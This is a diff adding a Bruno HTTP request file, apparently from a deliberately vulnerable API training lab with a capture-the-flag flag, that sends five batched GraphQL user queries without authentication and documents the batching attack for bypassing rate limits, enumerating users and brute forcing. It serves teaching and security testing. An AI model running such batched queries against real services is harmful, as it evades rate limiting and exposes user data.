@@ -1,0 +1,37 @@
+meta {
+  name: G03 Batching Attack
+  type: http
+  seq: 3
+}
+
+post {
+  url: {{baseUrl}}/graphql
+  body: json
+  auth: none
+}
+
+body:json {
+  [
+    {"query": "{ user(id: 1) { username } }"},
+    {"query": "{ user(id: 2) { username } }"},
+    {"query": "{ user(id: 3) { username } }"},
+    {"query": "{ user(id: 4) { username } }"},
+    {"query": "{ user(id: 5) { username } }"}
+  ]
+}
+
+docs {
+  # G03: GraphQL Batching Attack
+
+  ## Vulnerability
+  No limit on batched operations.
+
+  ## Exploit
+  Send array of queries in single request:
+  - Bypass rate limiting
+  - Enumerate users/data
+  - Brute force in one request
+
+  ## Flag
+  VULNAPI{graphql_batch_*}
+}
